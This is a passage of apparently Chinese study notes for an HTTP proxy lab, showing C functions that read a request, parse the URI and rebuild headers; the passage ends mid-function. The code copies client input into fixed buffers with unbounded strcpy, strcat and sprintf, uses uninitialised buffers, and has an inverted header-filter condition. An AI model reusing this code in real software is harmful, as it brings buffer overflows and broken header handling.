<span class=normal><a href=#__codelineno-182-45>45</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-182-1><a id=__codelineno-182-1 name=__codelineno-182-1></a><span class=kt>void</span><span class=w> </span><span class=nf>doit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>connfd</span><span class=p>)</span>
</span><span id=__span-182-2><a id=__codelineno-182-2 name=__codelineno-182-2></a><span class=p>{</span>
</span><span id=__span-182-3><a id=__codelineno-182-3 name=__codelineno-182-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>method</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>uri</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>version</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-182-4><a id=__codelineno-182-4 name=__codelineno-182-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>server</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-182-5><a id=__codelineno-182-5 name=__codelineno-182-5></a>
</span><span id=__span-182-6><a id=__codelineno-182-6 name=__codelineno-182-6></a><span class=w>    </span><span class=n>rio_t</span><span class=w> </span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>server_rio</span><span class=p>;</span>
</span><span id=__span-182-7><a id=__codelineno-182-7 name=__codelineno-182-7></a>
</span><span id=__span-182-8><a id=__codelineno-182-8 name=__codelineno-182-8></a><span class=w>    </span><span class=n>Rio_readinitb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-182-9><a id=__codelineno-182-9 name=__codelineno-182-9></a><span class=w>    </span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>);</span>
</span><span id=__span-182-10><a id=__codelineno-182-10 name=__codelineno-182-10></a><span class=w>    </span><span class=n>sscanf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%s %s %s"</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>version</span><span class=p>);</span>
</span><span id=__span-182-11><a id=__codelineno-182-11 name=__codelineno-182-11></a>
</span><span id=__span-182-12><a id=__codelineno-182-12 name=__codelineno-182-12></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>strcasecmp</span><span class=p>(</span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=s>"GET"</span><span class=p>))</span>
</span><span id=__span-182-13><a id=__codelineno-182-13 name=__codelineno-182-13></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-182-14><a id=__codelineno-182-14 name=__codelineno-182-14></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Proxy does not implement the method"</span><span class=p>);</span>
</span><span id=__span-182-15><a id=__codelineno-182-15 name=__codelineno-182-15></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-182-16><a id=__codelineno-182-16 name=__codelineno-182-16></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-182-17><a id=__codelineno-182-17 name=__codelineno-182-17></a>
</span><span id=__span-182-18><a id=__codelineno-182-18 name=__codelineno-182-18></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=n>uri_data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=p>));</span>
</span><span id=__span-182-19><a id=__codelineno-182-19 name=__codelineno-182-19></a><span class=w>    </span><span class=c1>// 解析uri</span>
</span><span id=__span-182-20><a id=__codelineno-182-20 name=__codelineno-182-20></a><span class=w>    </span><span class=n>parse_uri</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=p>);</span>
</span><span id=__span-182-21><a id=__codelineno-182-21 name=__codelineno-182-21></a>
</span><span id=__span-182-22><a id=__codelineno-182-22 name=__codelineno-182-22></a><span class=w>    </span><span class=c1>// 设置header</span>
</span><span id=__span-182-23><a id=__codelineno-182-23 name=__codelineno-182-23></a><span class=w>    </span><span class=n>build_header</span><span class=p>(</span><span class=n>server</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>rio</span><span class=p>);</span>
</span><span id=__span-182-24><a id=__codelineno-182-24 name=__codelineno-182-24></a>
</span><span id=__span-182-25><a id=__codelineno-182-25 name=__codelineno-182-25></a><span class=w>    </span><span class=c1>// 连接服务器</span>
</span><span id=__span-182-26><a id=__codelineno-182-26 name=__codelineno-182-26></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>serverfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open_clientfd</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>host</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>port</span><span class=p>);</span>
</span><span id=__span-182-27><a id=__codelineno-182-27 name=__codelineno-182-27></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>serverfd</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-182-28><a id=__codelineno-182-28 name=__codelineno-182-28></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-182-29><a id=__codelineno-182-29 name=__codelineno-182-29></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"connection failed</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-182-30><a id=__codelineno-182-30 name=__codelineno-182-30></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-182-31><a id=__codelineno-182-31 name=__codelineno-182-31></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-182-32><a id=__codelineno-182-32 name=__codelineno-182-32></a><span class=w>    </span><span class=c1>// 转发给服务器</span>
</span><span id=__span-182-33><a id=__codelineno-182-33 name=__codelineno-182-33></a><span class=w>    </span><span class=n>Rio_readinitb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>server_rio</span><span class=p>,</span><span class=w> </span><span class=n>serverfd</span><span class=p>);</span>
</span><span id=__span-182-34><a id=__codelineno-182-34 name=__codelineno-182-34></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>serverfd</span><span class=p>,</span><span class=w> </span><span class=n>server</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>server</span><span class=p>));</span>
</span><span id=__span-182-35><a id=__codelineno-182-35 name=__codelineno-182-35></a>
</span><span id=__span-182-36><a id=__codelineno-182-36 name=__codelineno-182-36></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>n</span><span class=p>;</span>
</span><span id=__span-182-37><a id=__codelineno-182-37 name=__codelineno-182-37></a><span class=w>    </span><span class=c1>// 回复给客户端</span>
</span><span id=__span-182-38><a id=__codelineno-182-38 name=__codelineno-182-38></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>n</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>server_rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-182-39><a id=__codelineno-182-39 name=__codelineno-182-39></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-182-40><a id=__codelineno-182-40 name=__codelineno-182-40></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"proxy received %d bytes,then send</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>n</span><span class=p>);</span>
</span><span id=__span-182-41><a id=__codelineno-182-41 name=__codelineno-182-41></a><span class=w>        </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>n</span><span class=p>);</span>
</span><span id=__span-182-42><a id=__codelineno-182-42 name=__codelineno-182-42></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-182-43><a id=__codelineno-182-43 name=__codelineno-182-43></a><span class=w>    </span><span class=c1>// 关闭服务器描述符</span>
</span><span id=__span-182-44><a id=__codelineno-182-44 name=__codelineno-182-44></a><span class=w>    </span><span class=n>Close</span><span class=p>(</span><span class=n>serverfd</span><span class=p>);</span>
</span><span id=__span-182-45><a id=__codelineno-182-45 name=__codelineno-182-45></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=header>构建header<a class=headerlink href=#header title="Permanent link">¶</a></h4> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-183-1> 1</a></span>
<span class=normal><a href=#__codelineno-183-2> 2</a></span>
<span class=normal><a href=#__codelineno-183-3> 3</a></span>
<span class=normal><a href=#__codelineno-183-4> 4</a></span>
<span class=normal><a href=#__codelineno-183-5> 5</a></span>
<span class=normal><a href=#__codelineno-183-6> 6</a></span>
<span class=normal><a href=#__codelineno-183-7> 7</a></span>
<span class=normal><a href=#__codelineno-183-8> 8</a></span>
<span class=normal><a href=#__codelineno-183-9> 9</a></span>
<span class=normal><a href=#__codelineno-183-10>10</a></span>
<span class=normal><a href=#__codelineno-183-11>11</a></span>
<span class=normal><a href=#__codelineno-183-12>12</a></span>
<span class=normal><a href=#__codelineno-183-13>13</a></span>
<span class=normal><a href=#__codelineno-183-14>14</a></span>
<span class=normal><a href=#__codelineno-183-15>15</a></span>
<span class=normal><a href=#__codelineno-183-16>16</a></span>
<span class=normal><a href=#__codelineno-183-17>17</a></span>
<span class=normal><a href=#__codelineno-183-18>18</a></span>
<span class=normal><a href=#__codelineno-183-19>19</a></span>
<span class=normal><a href=#__codelineno-183-20>20</a></span>
<span class=normal><a href=#__codelineno-183-21>21</a></span>
<span class=normal><a href=#__codelineno-183-22>22</a></span>
<span class=normal><a href=#__codelineno-183-23>23</a></span>
<span class=normal><a href=#__codelineno-183-24>24</a></span>
<span class=normal><a href=#__codelineno-183-25>25</a></span>
<span class=normal><a href=#__codelineno-183-26>26</a></span>
<span class=normal><a href=#__codelineno-183-27>27</a></span>
<span class=normal><a href=#__codelineno-183-28>28</a></span>
<span class=normal><a href=#__codelineno-183-29>29</a></span>
<span class=normal><a href=#__codelineno-183-30>30</a></span>
<span class=normal><a href=#__codelineno-183-31>31</a></span>
<span class=normal><a href=#__codelineno-183-32>32</a></span>
<span class=normal><a href=#__codelineno-183-33>33</a></span>
<span class=normal><a href=#__codelineno-183-34>34</a></span>
<span class=normal><a href=#__codelineno-183-35>35</a></span>
<span class=normal><a href=#__codelineno-183-36>36</a></span>
<span class=normal><a href=#__codelineno-183-37>37</a></span>
<span class=normal><a href=#__codelineno-183-38>38</a></span>
<span class=normal><a href=#__codelineno-183-39>39</a></span>
<span class=normal><a href=#__codelineno-183-40>40</a></span>
<span class=normal><a href=#__codelineno-183-41>41</a></span>
<span class=normal><a href=#__codelineno-183-42>42</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-183-1><a id=__codelineno-183-1 name=__codelineno-183-1></a><span class=kt>void</span><span class=w> </span><span class=nf>build_header</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>http_header</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=n>uri_data</span><span class=p>,</span><span class=w> </span><span class=n>rio_t</span><span class=w> </span><span class=o>*</span><span class=n>client_rio</span><span class=p>)</span>
</span><span id=__span-183-2><a id=__codelineno-183-2 name=__codelineno-183-2></a><span class=p>{</span>
</span><span id=__span-183-3><a id=__codelineno-183-3 name=__codelineno-183-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>User_Agent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-4><a id=__codelineno-183-4 name=__codelineno-183-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>conn_hdr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"Connection: close</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-5><a id=__codelineno-183-5 name=__codelineno-183-5></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>prox_hdr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"Proxy-Connection: close</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-6><a id=__codelineno-183-6 name=__codelineno-183-6></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>host_hdr_format</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"Host: %s</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-7><a id=__codelineno-183-7 name=__codelineno-183-7></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>requestlint_hdr_format</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"GET %s HTTP/1.0</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-8><a id=__codelineno-183-8 name=__codelineno-183-8></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>endof_hdr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>"</span><span class=se>\r\n</span><span class=s>"</span><span class=p>;</span>
</span><span id=__span-183-9><a id=__codelineno-183-9 name=__codelineno-183-9></a>
</span><span id=__span-183-10><a id=__codelineno-183-10 name=__codelineno-183-10></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>request_hdr</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>other_hdr</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>host_hdr</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-183-11><a id=__codelineno-183-11 name=__codelineno-183-11></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>request_hdr</span><span class=p>,</span><span class=w> </span><span class=n>requestlint_hdr_format</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>path</span><span class=p>);</span>
</span><span id=__span-183-12><a id=__codelineno-183-12 name=__codelineno-183-12></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=n>client_rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-183-13><a id=__codelineno-183-13 name=__codelineno-183-13></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-183-14><a id=__codelineno-183-14 name=__codelineno-183-14></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>endof_hdr</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-183-15><a id=__codelineno-183-15 name=__codelineno-183-15></a><span class=w>            </span><span class=k>break</span><span class=p>;</span><span class=w> </span><span class=cm>/*EOF*/</span>
</span><span id=__span-183-16><a id=__codelineno-183-16 name=__codelineno-183-16></a>
</span><span id=__span-183-17><a id=__codelineno-183-17 name=__codelineno-183-17></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strncasecmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"Host"</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=s>"Host"</span><span class=p>)))</span><span class=w> </span><span class=cm>/*Host:*/</span>
</span><span id=__span-183-18><a id=__codelineno-183-18 name=__codelineno-183-18></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-183-19><a id=__codelineno-183-19 name=__codelineno-183-19></a><span class=w>            </span><span class=n>strcpy</span><span class=p>(</span><span class=n>host_hdr</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-183-20><a id=__codelineno-183-20 name=__codelineno-183-20></a><span class=w>            </span><span class=k>continue</span><span class=p>;</span>
</span><span id=__span-183-21><a id=__codelineno-183-21 name=__codelineno-183-21></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-183-22><a id=__codelineno-183-22 name=__codelineno-183-22></a>
</span><span id=__span-183-23><a id=__codelineno-183-23 name=__codelineno-183-23></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strncasecmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"Connection"</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=s>"Connection"</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>strncasecmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"Proxy-Connection"</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=s>"Proxy-Connection"</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>strncasecmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"User-Agent"</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=s>"User-Agent"</span><span class=p>)))</span>
</span><span id=__span-183-24><a id=__codelineno-183-24 name=__codelineno-183-24></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-183-25><a id=__codelineno-183-25 name=__codelineno-183-25></a><span class=w>            </span><span class=n>strcat</span><span class=p>(</span><span class=n>other_hdr</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-183-26><a id=__codelineno-183-26 name=__codelineno-183-26></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-183-27><a id=__codelineno-183-27 name=__codelineno-183-27></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-183-28><a id=__codelineno-183-28 name=__codelineno-183-28></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>strlen</span><span class=p>(</span><span class=n>host_hdr</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-183-29><a id=__codelineno-183-29 name=__codelineno-183-29></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-183-30><a id=__codelineno-183-30 name=__codelineno-183-30></a><span class=w>        </span><span class=n>sprintf</span><span class=p>(</span><span class=n>host_hdr</span><span class=p>,</span><span class=w> </span><span class=n>host_hdr_format</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>host</span><span class=p>);</span>
</span><span id=__span-183-31><a id=__codelineno-183-31 name=__codelineno-183-31></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-183-32><a id=__codelineno-183-32 name=__codelineno-183-32></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>http_header</span><span class=p>,</span><span class=w> </span><span class=s>"%s%s%s%s%s%s%s"</span><span class=p>,</span>
</span><span id=__span-183-33><a id=__codelineno-183-33 name=__codelineno-183-33></a><span class=w>            </span><span class=n>request_hdr</span><span class=p>,</span>
</span><span id=__span-183-34><a id=__codelineno-183-34 name=__codelineno-183-34></a><span class=w>            </span><span class=n>host_hdr</span><span class=p>,</span>
</span><span id=__span-183-35><a id=__codelineno-183-35 name=__codelineno-183-35></a><span class=w>            </span><span class=n>conn_hdr</span><span class=p>,</span>
</span><span id=__span-183-36><a id=__codelineno-183-36 name=__codelineno-183-36></a><span class=w>            </span><span class=n>prox_hdr</span><span class=p>,</span>
</span><span id=__span-183-37><a id=__codelineno-183-37 name=__codelineno-183-37></a><span class=w>            </span><span class=n>User_Agent</span><span class=p>,</span>
</span><span id=__span-183-38><a id=__codelineno-183-38 name=__codelineno-183-38></a><span class=w>            </span><span class=n>other_hdr</span><span class=p>,</span>
</span><span id=__span-183-39><a id=__codelineno-183-39 name=__codelineno-183-39></a><span class=w>            </span><span class=n>endof_hdr</span><span class=p>);</span>
</span><span id=__span-183-40><a id=__codelineno-183-40 name=__codelineno-183-40></a>
</span><span id=__span-183-41><a id=__codelineno-183-41 name=__codelineno-183-41></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-183-42><a id=__codelineno-183-42 name=__codelineno-183-42></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=uri>解析uri<a class=headerlink href=#uri title="Permanent link">¶</a></h4> <p>根据 uri 结构定义一个结构体：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-184-1>1</a></span>
<span class=normal><a href=#__codelineno-184-2>2</a></span>
<span class=normal><a href=#__codelineno-184-3>3</a></span>
<span class=normal><a href=#__codelineno-184-4>4</a></span>
<span class=normal><a href=#__codelineno-184-5>5</a></span>
<span class=normal><a href=#__codelineno-184-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-184-1><a id=__codelineno-184-1 name=__codelineno-184-1></a><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span>
</span><span id=__span-184-2><a id=__codelineno-184-2 name=__codelineno-184-2></a><span class=p>{</span>
</span><span id=__span-184-3><a id=__codelineno-184-3 name=__codelineno-184-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>host</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span><span class=w> </span><span class=c1>// 主机名</span>
</span><span id=__span-184-4><a id=__codelineno-184-4 name=__codelineno-184-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>port</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span><span class=w> </span><span class=c1>// 端口</span>
</span><span id=__span-184-5><a id=__codelineno-184-5 name=__codelineno-184-5></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>path</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span><span class=w> </span><span class=c1>// 请求路径</span>
</span><span id=__span-184-6><a id=__codelineno-184-6 name=__codelineno-184-6></a><span class=p>};</span>
</span></code></pre></div></td></tr></table></div> <p>解析函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-185-1> 1</a></span>
<span class=normal><a href=#__codelineno-185-2> 2</a></span>
<span class=normal><a href=#__codelineno-185-3> 3</a></span>
<span class=normal><a href=#__codelineno-185-4> 4</a></span>
<span class=normal><a href=#__codelineno-185-5> 5</a></span>
<span class=normal><a href=#__codelineno-185-6> 6</a></span>
<span class=normal><a href=#__codelineno-185-7> 7</a></span>
<span class=normal><a href=#__codelineno-185-8> 8</a></span>
<span class=normal><a href=#__codelineno-185-9> 9</a></span>
<span class=normal><a href=#__codelineno-185-10>10</a></span>
<span class=normal><a href=#__codelineno-185-11>11</a></span>
<span class=normal><a href=#__codelineno-185-12>12</a></span>
<span class=normal><a href=#__codelineno-185-13>13</a></span>
<span class=normal><a href=#__codelineno-185-14>14</a></span>
<span class=normal><a href=#__codelineno-185-15>15</a></span>
<span class=normal><a href=#__codelineno-185-16>16</a></span>
<span class=normal><a href=#__codelineno-185-17>17</a></span>
<span class=normal><a href=#__codelineno-185-18>18</a></span>
<span class=normal><a href=#__codelineno-185-19>19</a></span>
<span class=normal><a href=#__codelineno-185-20>20</a></span>
<span class=normal><a href=#__codelineno-185-21>21</a></span>
<span class=normal><a href=#__codelineno-185-22>22</a></span>
<span class=normal><a href=#__codelineno-185-23>23</a></span>
<span class=normal><a href=#__codelineno-185-24>24</a></span>
<span class=normal><a href=#__codelineno-185-25>25</a></span>
<span class=normal><a href=#__codelineno-185-26>26</a></span>
<span class=normal><a href=#__codelineno-185-27>27</a></span>
<span class=normal><a href=#__codelineno-185-28>28</a></span>
<span class=normal><a href=#__codelineno-185-29>29</a></span>
<span class=normal><a href=#__codelineno-185-30>30</a></span>
<span class=normal><a href=#__codelineno-185-31>31</a></span>
<span class=normal><a href=#__codelineno-185-32>32</a></span>
<span class=normal><a href=#__codelineno-185-33>33</a></span>
<span class=normal><a href=#__codelineno-185-34>34</a></span>
<span class=normal><a href=#__codelineno-185-35>35</a></span>
<span class=normal><a href=#__codelineno-185-36>36</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-185-1><a id=__codelineno-185-1 name=__codelineno-185-1></a><span class=kt>void</span><span class=w> </span><span class=nf>parse_uri</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=n>uri_data</span><span class=p>)</span>
</span><span id=__span-185-2><a id=__codelineno-185-2 name=__codelineno-185-2></a><span class=p>{</span>
</span><span id=__span-185-3><a id=__codelineno-185-3 name=__codelineno-185-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>hostpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strstr</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=s>"//"</span><span class=p>);</span>
</span><span id=__span-185-4><a id=__codelineno-185-4 name=__codelineno-185-4></a><span class=w>    </span><span class=c1>//默认端口为80</span>
</span><span id=__span-185-5><a id=__codelineno-185-5 name=__codelineno-185-5></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>hostpose</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-185-6><a id=__codelineno-185-6 name=__codelineno-185-6></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-185-7><a id=__codelineno-185-7 name=__codelineno-185-7></a><span class=w>        </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>pathpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strstr</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=s>"/"</span><span class=p>);</span>
</span><span id=__span-185-8><a id=__codelineno-185-8 name=__codelineno-185-8></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>pathpose</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-185-9><a id=__codelineno-185-9 name=__codelineno-185-9></a><span class=w>            </span><span class=n>strcpy</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>path</span><span class=p>,</span><span class=w> </span><span class=n>pathpose</span><span class=p>);</span>
</span><span id=__span-185-10><a id=__codelineno-185-10 name=__codelineno-185-10></a><span class=w>        </span><span class=n>strcpy</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=s>"80"</span><span class=p>);</span>
</span><span id=__span-185-11><a id=__codelineno-185-11 name=__codelineno-185-11></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-185-12><a id=__codelineno-185-12 name=__codelineno-185-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-185-13><a id=__codelineno-185-13 name=__codelineno-185-13></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-185-14><a id=__codelineno-185-14 name=__codelineno-185-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-185-15><a id=__codelineno-185-15 name=__codelineno-185-15></a><span class=w>        </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>portpose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strstr</span><span class=p>(</span><span class=n>hostpose</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=s>":"</span><span class=p>);</span>
